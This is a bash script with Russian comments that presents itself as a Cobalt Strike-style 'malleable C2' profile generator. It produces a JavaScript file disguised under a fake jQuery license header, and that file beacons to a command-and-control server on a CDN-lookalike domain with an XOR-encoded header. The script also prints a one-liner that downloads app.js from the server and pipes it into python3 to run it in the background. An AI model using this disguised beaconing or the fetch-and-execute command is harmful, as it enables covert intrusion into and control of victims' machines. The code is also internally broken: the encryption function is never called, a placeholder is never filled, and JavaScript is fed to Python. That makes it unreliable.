#!/bin/bash
# Malleable C2 Transformer — маскируем команды в JS/CSS
# В духе Cobalt Strike 4.10

SERVER=${1:-"https://cdn-update.azureedge.net"}
SECRET=${2:-"XOR_KEY_1337"}

echo "[TRANSFORMER] Создаю malleable профиль..."

# Функция XOR-шифрования
xor_encrypt() {
    local data=$1
    local key=$2
    python3 -c "
import sys
data='$data'
key='$key'
enc=''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
print(enc.encode().hex())
" 2>/dev/null
}

# Генерируем безобидный JS-файл со спрятанной командой
generate_c2_payload() {
    local js_template='
/*! jQuery v3.7.1 | (c) OpenJS Foundation and other contributors | jquery.org/license */
(function() {
    "use strict";
    
    // Core functions
    function __init__() {
        var _cache = {};
        var _config = {
            url: "__SERVER__",
            interval: 5000,
            retry: 3
        };
        
        // Performance observer (легитимный код)
        if (window.performance && typeof window.performance.getEntries === "function") {
            var _perf = window.performance.getEntries();
            if (_perf.length > 0) {
                _cache["perf"] = _perf[0].name;
            }
        }
        
        // Загрузка конфигурации (маскировка под загрузку ресурсов)
        function _loadConfig() {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", _config.url + "/api/config?ts=" + Date.now(), true);
            xhr.setRequestHeader("Accept", "application/json");
            xhr.setRequestHeader("X-Request-ID", "__XOR_PAYLOAD__");
            xhr.onload = function() {
                if (xhr.status === 200) {
                    var _data = JSON.parse(xhr.responseText);
                    if (_data && _data.status === "ok") {
                        _cache["ready"] = true;
                    }
                }
            };
            xhr.send(null);
        }
        
        _loadConfig();
    }
    
    __init__();
})();'
    
    echo "$js_template" | sed "s|__SERVER__|$SERVER|g"
}

echo "[TRANSFORMER] Профиль создан"
echo "[TRANSFORMER] Доставка: curl -sk $SERVER/app.js | python3 -c \"\$(cat)\" &"
